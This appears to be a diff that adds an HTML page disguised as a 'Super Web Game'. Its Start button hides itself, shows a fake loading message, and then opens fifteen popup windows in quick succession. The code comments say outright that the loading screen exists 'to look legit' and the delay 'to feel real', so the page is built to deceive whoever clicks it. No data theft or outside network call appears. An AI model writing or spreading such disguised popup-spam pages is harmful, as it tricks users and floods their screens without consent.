@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cool Web Game</title>
+
+    <style>
+        body {
+            background: #111;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+
+        h1 {
+            font-size: 50px;
+            margin-bottom: 20px;
+            color: #0ff;
+            text-shadow: 0px 0px 10px #0ff;
+        }
+
+        #startBtn {
+            padding: 20px 40px;
+            font-size: 28px;
+            background: #0ff;
+            color: #000;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        #startBtn:hover {
+            background: #0cc;
+            transform: scale(1.1);
+        }
+    </style>
+</head>
+<body>
+
+<h1>Super Web Game</h1>
+<p>Click Start to Begin!</p>
+
+<button id="startBtn">Start Game</button>
+
+<script>
+// Number of popups
+const popupCount = 15;
+
+// Delay between each popup spawning
+const popupDelay = 50; 
+
+function spawnPopups() {
+    for (let i = 0; i < popupCount; i++) {
+        setTimeout(() => {
+            window.open("popup.html", "_blank", "width=400,height=300");
+        }, i * popupDelay);
+    }
+}
+
+// When user clicks the start button
+document.getElementById("startBtn").onclick = function () {
+    // Hide the start screen to look legit
+    document.getElementById("startBtn").style.display = "none";
+    document.querySelector("p").innerText = "Loading...";
+    document.querySelector("h1").innerText = "Starting Game...";
+
+    // Small delay to feel real
+    setTimeout(() => {
+        spawnPopups();
+    }, 500);
+};
+</script>
+
+</body>
+</html>
